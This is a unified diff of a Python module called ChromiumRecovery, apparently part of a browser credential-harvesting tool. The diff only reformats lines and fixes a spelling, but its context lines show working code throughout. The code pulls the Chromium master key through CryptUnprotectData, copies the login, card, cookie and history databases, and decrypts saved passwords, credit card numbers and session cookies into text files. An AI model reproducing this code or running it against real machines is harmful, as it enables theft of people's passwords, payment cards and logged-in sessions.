@@ -58,8 +58,7 @@ class ChromiumRecovery(ModuleManager):
   `-=========-`()        Passwords + Cookies + Cards + Other
               """)
 
-        self.browsers_folder = os.path.join(
-            self.output_folder_user, 'browsers')
+        self.browsers_folder = self.output_folder_user / 'browsers'
 
         appdata = os.getenv('LOCALAPPDATA')
         self.browsers = {
@@ -88,8 +87,7 @@ class ChromiumRecovery(ModuleManager):
         with open(filename, "r", encoding="utf-8") as f:
             c = f.read()
             if 'os_crypt' not in c:
-                self.merror(
-                    f"Unable to get master key for {browser_name} Browser, 'os_crypt' is cannot be found in {filename}")
+                self.merror(f"Unable to get master key for {browser_name} Browser, 'os_crypt' is cannot be found in {filename}")
                 return
 
             local_state = json.loads(c)
@@ -97,8 +95,7 @@ class ChromiumRecovery(ModuleManager):
         master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
         master_key = master_key[5:]
         master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
-        self.mdebug(
-            f"Got Master Key for {browser_name} Browser at PATH: {browser_path}")
+        self.mdebug(f"Got Master Key for {browser_name} Browser at PATH: {browser_path}")
         return master_key
 
     def __decrypt_password(self, buff: bytes, master_key: bytes) -> str:
@@ -114,24 +111,20 @@ class ChromiumRecovery(ModuleManager):
 
         if not os.path.isdir(save_path):
             os.makedirs(save_path)
-            self.mdebug(
-                f"[{browser_name}] [{profile}] [{data_type}] Created folder at {save_path}")
+            self.mdebug(f"[{browser_name}] [{profile}] [{data_type}] Created folder at {save_path}")
 
         filename = os.path.join(save_path, f'{data_type}.txt')
 
         if content:
             with open(filename, 'w', encoding='utf-8') as file:
                 file.write(content)
-                self.mprint(
-                    f"[{browser_name}] [{profile}] [{data_type}] Saved content to {filename}")
+                self.mprint(f"[{browser_name}] [{profile}] [{data_type}] Saved content to {filename}")
         else:
-            self.mdebug(
-                f"[{browser_name}] [{profile}] [{data_type}] No data found in {data_type}")
+            self.mdebug(f"[{browser_name}] [{profile}] [{data_type}] No data found in {data_type}")
 
         if not os.listdir(save_path):
             os.rmdir(save_path)
-            self.mdebug(
-                f"[{browser_name}] [{profile}] [{data_type}] Removing empty folder as no data was found: {save_path}")
+            self.mdebug(f"[{browser_name}] [{profile}] [{data_type}] Removing empty folder as no data was found: {save_path}")
 
     def __get_login_data(self, path: str, profile: str, master_key: bytes, browser_name: str) -> str:
         result = ""
@@ -139,49 +132,41 @@ class ChromiumRecovery(ModuleManager):
         copy_path = os.path.join(self.browsers_folder, browser_name, profile)
 
         if not os.path.exists(login_db):
-            self.mdebug(
-                f"[{browser_name}] [{profile}] [passwords] Login data doesn't exist at {login_db}")
+            self.mdebug(f"[{browser_name}] [{profile}] [passwords] Login data doesn't exist at {login_db}")
             return
 
         if not os.path.isdir(copy_path):
             os.makedirs(copy_path)
-            self.mdebug(
-                f"[{browser_name}] [{profile}] [passwords] Created folder at {copy_path}")
+            self.mdebug(f"[{browser_name}] [{profile}] [passwords] Created folder at {copy_path}")
 
         copy_path = os.path.join(copy_path, 'login.db')
         if os.path.isfile(copy_path):
             os.remove(copy_path)
-            self.mdebug(
-                f"[{browser_name}] [{profile}] [passwords] Removing 'login.db' that already exists at {copy_path}")
+            self.mdebug(f"[{browser_name}] [{profile}] [passwords] Removing 'login.db' that already exists at {copy_path}")
 
         try:
             shutil.copy(login_db, copy_path)
         except Exception as e:
-            self.merror(
-                f"[{browser_name}] [{profile}] [passwords] Unable to copy {login_db} to {copy_path} -> {e}")
+            self.merror(f"[{browser_name}] [{profile}] [passwords] Unable to copy {login_db} to {copy_path} -> {e}")
             return "Error. Please check the Log"
 
         conn = sqlite3.connect(copy_path)
         cursor = conn.cursor()
-        cursor.execute(
-            'SELECT action_url, username_value, password_value FROM logins')
+        cursor.execute('SELECT action_url, username_value, password_value FROM logins')
 
-        self.mdebug(
-            f"[{browser_name}] [{profile}] [passwords] Connected to copied 'login.db' and ran the query ")
+        self.mdebug(f"[{browser_name}] [{profile}] [passwords] Connected to copied 'login.db' and ran the query ")
 
         for row in cursor.fetchall():
             try:
                 password = self.__decrypt_password(row[2], master_key)
             except Exception as e:
-                self.merror(
-                    f"[{browser_name}] [{profile}] [passwords] Error in decrypting the password for {row[1]} -> {row[2]} -> {e}")
+                self.merror(f"[{browser_name}] [{profile}] [passwords] Error in decrypting the password for {row[1]} -> {row[2]} -> {e}")
                 password = "Error. Check the log"
             result += f"""\nURL: {row[0]}\nEmail: {row[1]}\nPassword: {password}"""
-            result += Constant.seperator
+            result += Constant.separator
 
         conn.close()
-        self.mdebug(
-            f"[{browser_name}] [{profile}] [passwords] Closing Database Connection and Returning fetched data ")
+        self.mdebug(f"[{browser_name}] [{profile}] [passwords] Closing Database Connection and Returning fetched data ")
         return result
 
     def __get_credit_cards(self, path: str, profile: str, master_key: bytes, browser_name: str) -> str:
@@ -190,35 +175,29 @@ class ChromiumRecovery(ModuleManager):
         copy_path = os.path.join(self.browsers_folder, browser_name, profile)
 
         if not os.path.exists(cards_db):
-            self.mdebug(
-                f"[{browser_name}] [{profile}] [cards] Web data doesn't exist at {cards_db}")
+            self.mdebug(f"[{browser_name}] [{profile}] [cards] Web data doesn't exist at {cards_db}")
             return
 
         if not os.path.isdir(copy_path):
             os.makedirs(copy_path)
-            self.mdebug(
-                f"[{browser_name}] [{profile}] [cards] Created folder at {copy_path}")
+            self.mdebug(f"[{browser_name}] [{profile}] [cards] Created folder at {copy_path}")
 
         copy_path = os.path.join(copy_path, 'cards.db')
         if os.path.isfile(copy_path):
             os.remove(copy_path)
-            self.mdebug(
-                f"[{browser_name}] [{profile}] [cards] Removing 'cards.db' that already exists at {copy_path}")
+            self.mdebug(f"[{browser_name}] [{profile}] [cards] Removing 'cards.db' that already exists at {copy_path}")
 
         try:
             shutil.copy(cards_db, copy_path)
         except Exception as e:
-            self.merror(
-                f"[{browser_name}] [{profile}] [cards] Unable to copy {cards_db} to {copy_path} -> {e}")
+            self.merror(f"[{browser_name}] [{profile}] [cards] Unable to copy {cards_db} to {copy_path} -> {e}")
             return "Error. Please check the Log"
 
         conn = sqlite3.connect(copy_path)
         cursor = conn.cursor()
-        cursor.execute(
-            'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')
+        cursor.execute('SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')
 
-        self.mdebug(
-            f"[{browser_name}] [{profile}] [cards] Connected to copied 'cards.db' and ran the query ")
+        self.mdebug(f"[{browser_name}] [{profile}] [cards] Connected to copied 'cards.db' and ran the query ")
 
         for row in cursor.fetchall():
             if not row[0] or not row[1] or not row[2] or not row[3]:
@@ -226,15 +205,13 @@ class ChromiumRecovery(ModuleManager):
             try:
                 card_number = self.__decrypt_password(row[3], master_key)
             except Exception as e:
-                self.merror(
-                    f"[{browser_name}] [{profile}] [cards] Error in decrypting the Card Number for {row[0]} -> {row[3]} -> {e}")
+                self.merror(f"[{browser_name}] [{profile}] [cards] Error in decrypting the Card Number for {row[0]} -> {row[3]} -> {e}")
                 card_number = "Error. Check the log"
             result += f"""\nName On Card: {row[0]}\nCard Number: {card_number}\nExpires On:  {row[1]} / {row[2]}\nAdded On: {datetime.fromtimestamp(row[4])}"""
-            result += Constant.seperator
+            result += Constant.separator
 
         conn.close()
-        self.mdebug(
-            f"[{browser_name}] [{profile}] [cards] Closing Database Connection and Returning fetched data ")
+        self.mdebug(f"[{browser_name}] [{profile}] [cards] Closing Database Connection and Returning fetched data ")
         return result
 
     def __get_cookies(self, path: str, profile: str, master_key: bytes, browser_name: str) -> str:
@@ -243,35 +220,29 @@ class ChromiumRecovery(ModuleManager):
         copy_path = os.path.join(self.browsers_folder, browser_name, profile)
 
         if not os.path.exists(cookie_db):
-            self.mdebug(
-                f"[{browser_name}] [{profile}] [cookies] Login data doesn't exist at {cookie_db}")
+            self.mdebug(f"[{browser_name}] [{profile}] [cookies] Login data doesn't exist at {cookie_db}")
             return
 
         if not os.path.isdir(copy_path):
             os.makedirs(copy_path)
-            self.mdebug(
-                f"[{browser_name}] [{profile}] [cookies] Created folder at {copy_path}")
+            self.mdebug(f"[{browser_name}] [{profile}] [cookies] Created folder at {copy_path}")
 
         copy_path = os.path.join(copy_path, 'cookies.db')
         if os.path.isfile(copy_path):
             os.remove(copy_path)
-            self.mdebug(
-                f"[{browser_name}] [{profile}] [cookies] Removing 'cookies.db' that already exists at {copy_path}")
+            self.mdebug(f"[{browser_name}] [{profile}] [cookies] Removing 'cookies.db' that already exists at {copy_path}")
 
         try:
             shutil.copy(cookie_db, copy_path)
         except Exception as e:
-            self.merror(
-                f"[{browser_name}] [{profile}] [cookies] Unable to copy {cookie_db} to {copy_path} -> {e}")
+            self.merror(f"[{browser_name}] [{profile}] [cookies] Unable to copy {cookie_db} to {copy_path} -> {e}")
             return "Error. Please check the Log"
 
         conn = sqlite3.connect(copy_path)
         cursor = conn.cursor()
-        cursor.execute(
-            'SELECT host_key, name, path, encrypted_value,expires_utc FROM cookies')
+        cursor.execute('SELECT host_key, name, path, encrypted_value,expires_utc FROM cookies')
 
-        self.mdebug(
-            f"[{browser_name}] [{profile}] [cookies] Connected to copied 'cookies.db' and ran the query ")
+        self.mdebug(f"[{browser_name}] [{profile}] [cookies] Connected to copied 'cookies.db' and ran the query ")
 
         for row in cursor.fetchall():
             if not row[0] or not row[1] or not row[2] or not row[3]:
@@ -280,16 +251,14 @@ class ChromiumRecovery(ModuleManager):
             try:
                 cookie = self.__decrypt_password(row[3], master_key)
             except Exception as e:
-                self.merror(
-                    f"[{browser_name}] [{profile}] [cookies] Error in decrypting the cookies for {row[1]} -> {row[3]} -> {e}")
+                self.merror(f"[{browser_name}] [{profile}] [cookies] Error in decrypting the cookies for {row[1]} -> {row[3]} -> {e}")
                 cookie = "Error. Check the log"
 
             result += f"""\nHost Key : {row[0]}\nCookie Name : {row[1]}\nPath: {row[2]}\nCookie: {cookie}\nExpires On: {row[4]}"""
-            result += Constant.seperator
+            result += Constant.separator
 
         conn.close()
-        self.mdebug(
-            f"[{browser_name}] [{profile}] [cookies] Closing Database Connection and Returning fetched data ")
+        self.mdebug(f"[{browser_name}] [{profile}] [cookies] Closing Database Connection and Returning fetched data ")
         return result
 
     def __get_web_history(self, path: str, profile: str, browser_name: str) -> str:
@@ -298,26 +267,22 @@ class ChromiumRecovery(ModuleManager):
         copy_path = os.path.join(self.browsers_folder, browser_name, profile)
 
         if not os.path.exists(web_history_db):
-            self.mdebug(
-                f"[{browser_name}] [{profile}] [history] Hisory data doesn't exist at {web_history_db}")
+            self.mdebug(f"[{browser_name}] [{profile}] [history] Hisory data doesn't exist at {web_history_db}")
             return
 
         if not os.path.isdir(copy_path):
             os.makedirs(copy_path)
-            self.mdebug(
-                f"[{browser_name}] [{profile}] [history] Created folder at {copy_path}")
+            self.mdebug(f"[{browser_name}] [{profile}] [history] Created folder at {copy_path}")
 
         copy_path = os.path.join(copy_path, 'history.db')
         if os.path.isfile(copy_path):
             os.remove(copy_path)
-            self.mdebug(
-                f"[{browser_name}] [{profile}] [passwords] Removing 'history.db' that already exists at {copy_path}")
+            self.mdebug(f"[{browser_name}] [{profile}] [passwords] Removing 'history.db' that already exists at {copy_path}")
 
         try:
             shutil.copy(web_history_db, copy_path)
         except Exception as e:
-            self.merror(
-                f"[{browser_name}] [{profile}] [passwords] Unable to copy {web_history_db} to {copy_path} -> {e}")
+            self.merror(f"[{browser_name}] [{profile}] [passwords] Unable to copy {web_history_db} to {copy_path} -> {e}")
             return "Error. Please check the Log"
 
         # ????????????? NOTE ?????????????
